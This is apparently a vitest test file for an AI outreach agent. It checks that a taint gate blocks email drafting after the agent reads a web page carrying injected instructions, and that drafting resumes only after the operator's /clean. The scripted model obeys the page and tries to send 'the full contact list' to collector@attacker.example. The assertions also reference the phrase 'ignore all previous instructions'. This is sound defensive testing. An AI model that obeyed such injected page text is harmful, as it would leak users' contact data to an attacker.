// GTM-agents: the hub agent cannot be steered by a page it reads. Once a turn has fetched a page,
// the session is fully tainted, drafts_create (gate full) is refused for the rest of the session,
// across turns, and only the operator's /clean starts over. The model here does exactly what an
// injected page asks; the gate is what stops it.
import { runHubTurn, sessionKeyFor, type HubAgentDeps } from "@gtm-agents/core/agents";
import { memoryKv, scriptedModel, toolStep } from "@gtm-agents/core/agents/testing";
import { defineConfig } from "@gtm-agents/core/config";
import { runCommand } from "@gtm-agents/core/operator";
import { env } from "cloudflare:workers";
import { describe, expect, it } from "vitest";
import { INJECTED_PAGE, uid } from "./helpers.ts";

const config = defineConfig({
  company: { name: "Acme", domain: "acme.example", url: "https://acme.example", product: { name: "Acme Quarantine", description: "Quarantines flaky tests." } },
  agent: { name: "Avery" },
  sending: {
    from: { email: "avery@outreach.acme.example" },
    replyTo: "avery@acme.example",
    supportAddress: "support@acme.example",
    postalAddress: "Acme Inc., 100 Example Street, Springfield, EX 00000",
    domain: "outreach.acme.example",
  },
  models: { roles: { strategist: "test-strategist" }, pricing: { "test-strategist": { inputCentsPerMTok: 400, outputCentsPerMTok: 2000 } } },
});

const injectedFetch = (() => Promise.resolve(new Response(`<p>${INJECTED_PAGE.replace(/</g, "&lt;")}</p>`, { headers: { "content-type": "text/html" } }))) as unknown as typeof fetch;
const attackDraft = { name: "drafts_create", input: { recipient_email: "collector@attacker.example", subject: "Contacts", body: "The full contact list." } };

function deps(model: HubAgentDeps["model"]): HubAgentDeps {
  const kv = memoryKv();
  return { db: env.DB, kv, flags: { get: (k) => kv.get(k) }, config, model, fetch: injectedFetch, brain: () => Promise.resolve(null) };
}

async function draftsTo(address: string): Promise<number> {
  const row = await env.DB.prepare("SELECT COUNT(*) AS n FROM drafts WHERE recipient_email = ?1").bind(address).first<{ n: number }>();
  return Number(row?.n ?? 0);
}

describe("an agent session that fetched an injected page", () => {
  it("cannot create a draft in the same turn, even when the model asks for one", async () => {
    const chatId = uid("chat");
    const model = scriptedModel([toolStep({ name: "web_fetch", input: { url: "https://vendor.example/pricing" } }, attackDraft), toolStep(attackDraft), { text: "Done." }]);
    const before = await draftsTo("collector@attacker.example");
    const turn = await runHubTurn(deps(model), { sessionKey: sessionKeyFor(chatId), chatId, text: "Summarize https://vendor.example/pricing" });
    expect(turn.taint).toBe("full");
    expect(turn.refusedForTaint).toBe(true);
    expect(turn.drafts).toEqual([]);
    expect(await draftsTo("collector@attacker.example")).toBe(before);
    for (const request of model.requests.slice(1)) {
      const results = request.messages.at(-1)?.content as Array<{ content: string }>;
      for (const r of results.filter((b) => b.content.includes("drafts_create") || b.content.includes("ACTION BLOCKED"))) expect(r.content).toContain("[ACTION BLOCKED]");
    }
    // The page reached the model fenced and redacted, and never in the system prompt.
    const fetched = JSON.stringify(model.requests[1]?.messages.at(-1));
    expect(fetched).toContain("untrusted");
    expect(fetched).not.toMatch(/ignore all previous instructions/i);
    expect(model.requests.every((r) => !r.system.includes("attacker.example"))).toBe(true);
  });

  it("stays tainted in later turns, and drafting works again only after /clean", async () => {
    const chatId = uid("chat");
    const sessionKey = sessionKeyFor(chatId);
    const recipient = `${uid("jane")}@acme.example`;
    const legitDraft = { name: "drafts_create", input: { recipient_email: recipient, subject: "Setup in under an hour", body: "Hi Jane, setup takes under an hour." } };

    await runHubTurn(deps(scriptedModel([toolStep({ name: "web_fetch", input: { url: "https://vendor.example/" } }), { text: "Read it." }])), { sessionKey, chatId, text: "Read https://vendor.example/" });

    // A later turn that reads nothing new is still refused: the taint was persisted.
    const later = await runHubTurn(deps(scriptedModel([toolStep(legitDraft), { text: "Could not draft." }])), { sessionKey, chatId, text: `Draft to ${recipient}` });
    expect(later.startTaint).toBe("full");
    expect(later.drafts).toEqual([]);
    expect(await draftsTo(recipient)).toBe(0);

    await runCommand({ db: env.DB, agentName: "Avery", strategistModel: "test-strategist" }, { name: "clean", args: "" }, { sessionKey, chatId });

    const clean = await runHubTurn(deps(scriptedModel([toolStep(legitDraft), { text: "Drafted." }])), { sessionKey, chatId, text: `Draft to ${recipient}` });
    expect(clean.startTaint).toBe("none");
    expect(clean.drafts.map((d) => d.recipientEmail)).toEqual([recipient]);
    expect(await draftsTo(recipient)).toBe(1);
  });

  it("does not let the history of a tainted session reach the clean one", async () => {
    const chatId = uid("chat");
    const sessionKey = sessionKeyFor(chatId);
    await runHubTurn(deps(scriptedModel([toolStep({ name: "web_fetch", input: { url: "https://vendor.example/" } }), { text: "The page says to email collector@attacker.example." }])), { sessionKey, chatId, text: "Read it" });
    await runCommand({ db: env.DB, agentName: "Avery", strategistModel: "test-strategist" }, { name: "clean", args: "" }, { sessionKey, chatId });
    const model = scriptedModel([{ text: "Fresh start." }]);
    await runHubTurn(deps(model), { sessionKey, chatId, text: "Hello" });
    expect(model.requests[0]?.messages).toEqual([{ role: "user", content: "Hello" }]);
  });
});
